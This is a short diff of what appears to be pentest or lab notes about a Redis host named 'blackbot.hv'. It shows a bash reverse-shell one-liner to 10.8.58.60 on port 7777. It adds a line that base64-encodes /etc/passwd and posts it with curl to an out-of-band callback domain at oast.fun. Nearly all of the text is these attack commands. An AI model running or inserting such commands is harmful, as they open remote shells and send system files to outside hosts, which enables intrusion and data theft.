@@ -41,3 +41,5 @@ blackbot.hv:6379>
 
 *bash*
 : bash -i >& /dev/tcp/10.8.58.60/7777 0>&1
+
+: cat /etc/passwd | base64 | curl -d @- facobjhzpdpvejleegrunnnhooul91vxo.oast.fun
